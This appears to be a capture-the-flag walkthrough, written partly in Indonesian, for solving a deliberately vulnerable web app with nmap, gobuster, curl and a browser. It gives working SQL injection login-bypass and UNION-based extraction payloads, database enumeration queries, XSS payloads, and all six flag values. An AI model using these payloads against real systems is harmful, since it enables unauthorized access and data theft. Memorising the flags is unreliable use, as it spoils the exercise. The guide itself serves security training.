# 🔧 Manual Testing Guide - No Advanced Tools Required

## 🎯 Overview
Panduan ini menunjukkan cara menyelesaikan CTF hanya dengan tools dasar: **browser, curl, nmap, dan gobuster**.

## 🛠️ Required Tools Only
```bash
# Linux/macOS
sudo apt install nmap gobuster curl firefox  # Ubuntu/Debian
brew install nmap gobuster curl              # macOS

# Windows
choco install nmap gobuster curl firefox
```

## 🔍 Step-by-Step Manual Testing

### Phase 1: Reconnaissance
```bash
# Port scanning
nmap -p- [TARGET_IP]
nmap -sV -p 8080,8081,3306 [TARGET_IP]

# Directory enumeration
gobuster dir -u http://[TARGET_IP]:8080 -w /usr/share/wordlists/dirb/common.txt

# Information gathering
curl http://[TARGET_IP]:8080/robots.txt
curl -s http://[TARGET_IP]:8080 | grep -i "<!--"
```

### Phase 2: SQL Injection (Manual)

#### Login Bypass
```bash
# Test dengan curl
curl -X POST http://[TARGET_IP]:8080/ \
  -d "username=admin' OR '1'='1'-- &password=test&login=Login" \
  -c cookies.txt

# Atau gunakan browser:
# Username: admin' OR '1'='1'-- 
# Password: anything
```

#### Database Enumeration
```bash
# Test search functionality
curl -X GET "http://[TARGET_IP]:8080/dashboard.php?search=' UNION SELECT 1,2,3,4,5-- " \
  -b cookies.txt

# Extract user data
curl -X GET "http://[TARGET_IP]:8080/dashboard.php?search=' UNION SELECT 1,username,password,role,5 FROM users-- " \
  -b cookies.txt

# Extract employee data (contains flags)
curl -X GET "http://[TARGET_IP]:8080/dashboard.php?search=' UNION SELECT 1,name,department,secret_note,5 FROM employees-- " \
  -b cookies.txt
```

### Phase 3: XSS Discovery (Browser)

1. Login ke aplikasi
2. Search untuk "Alice" di dashboard
3. Lihat hasil yang mengandung `<script>alert("FLAG{xss_found_h3r3}")</script>`
4. XSS payload akan ter-execute di browser

### Phase 4: Manual Flag Collection

#### Flag 1: Hidden Service
```bash
# Akses hidden service yang ditemukan dari nmap
curl http://[TARGET_IP]:8081
# Flag: FLAG{hidden_service_discovered_8081}
```

#### Flag 2: Backup Files
```bash
# Dari gobuster, akses backup directory
curl http://[TARGET_IP]:8080/backup/database.sql
# Flag: FLAG{backup_files_exposed_g0bust3r}
```

#### Flag 3: SQL Injection
```bash
# Setelah berhasil login sebagai admin
# Flag: FLAG{sql_injection_master_b4d1c0d3}
```

#### Flag 4: XSS
```bash
# Search "Alice" di dashboard untuk melihat XSS
# Flag: FLAG{xss_found_h3r3}
```

#### Flag 5: Admin Access
```bash
# Akses admin panel setelah login
curl http://[TARGET_IP]:8080/admin/secrets.php -b cookies.txt
# Flag: FLAG{admin_access_s3cr3t_pr0j3ct}
```

#### Flag 6: Final Vault
```bash
# Akses security vault
curl http://[TARGET_IP]:8080/admin/vault.php -b cookies.txt
# Flag: FLAG{vault_master_mystery_solved_c0mpl3t3}
```

## 🌐 Browser-Only Method

### Using Developer Tools
1. **F12** untuk buka Developer Tools
2. **Network tab** untuk monitor HTTP requests
3. **Console tab** untuk test JavaScript
4. **Elements tab** untuk inspect HTML

### Manual SQL Injection via Browser
1. Buka `http://[TARGET_IP]:8080`
2. Di login form:
   - Username: `admin' OR '1'='1'-- `
   - Password: `anything`
3. Submit form
4. Jika berhasil, akan redirect ke dashboard

### Manual Search Testing
1. Di dashboard, gunakan search box
2. Test payload: `' UNION SELECT 1,2,3,4,5-- `
3. Lihat response untuk confirm SQL injection
4. Extract data dengan payload yang lebih spesifik

## 📝 Manual Payload Testing

### SQL Injection Payloads
```sql
-- Authentication bypass
admin' OR '1'='1'-- 
admin' OR 1=1-- 
' OR '1'='1
' OR 1=1#

-- Union-based injection
' UNION SELECT 1,2,3,4,5-- 
' UNION SELECT 1,username,password,role,5 FROM users-- 
' UNION SELECT 1,name,department,secret_note,5 FROM employees-- 

-- Database enumeration
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- 
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- 
```

### XSS Testing Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

## 🎯 Success Indicators

### SQL Injection Success
- Login berhasil tanpa kredensial valid
- Error messages yang mengungkap database info
- Data extraction berhasil

### XSS Success
- JavaScript alert muncul
- Payload ter-execute di browser
- Content injection berhasil

### Reconnaissance Success
- Port 8081 ditemukan (hidden service)
- Directory `/backup/` ditemukan
- File `robots.txt` memberikan hints

## 💡 Tips Manual Testing

1. **Gunakan Browser Developer Tools** - Network tab untuk monitor requests
2. **Save Cookies** - Gunakan `-c cookies.txt` dan `-b cookies.txt` di curl
3. **URL Encoding** - Encode special characters jika diperlukan
4. **Error Messages** - Perhatikan error messages untuk clues
5. **Source Code** - View page source untuk hidden comments

## 🚫 No Advanced Tools Needed

CTF ini dirancang agar bisa diselesaikan tanpa:
- ❌ Burp Suite
- ❌ OWASP ZAP  
- ❌ SQLmap
- ❌ Metasploit
- ❌ Custom scripts

Hanya perlu:
- ✅ Browser dengan Developer Tools
- ✅ Curl untuk HTTP requests
- ✅ Nmap untuk port scanning
- ✅ Gobuster untuk directory enumeration
- ✅ Basic command line skills

---

**Happy Manual Testing! 🕵️♂️**

*Remember: Understanding the fundamentals is more important than using advanced tools!*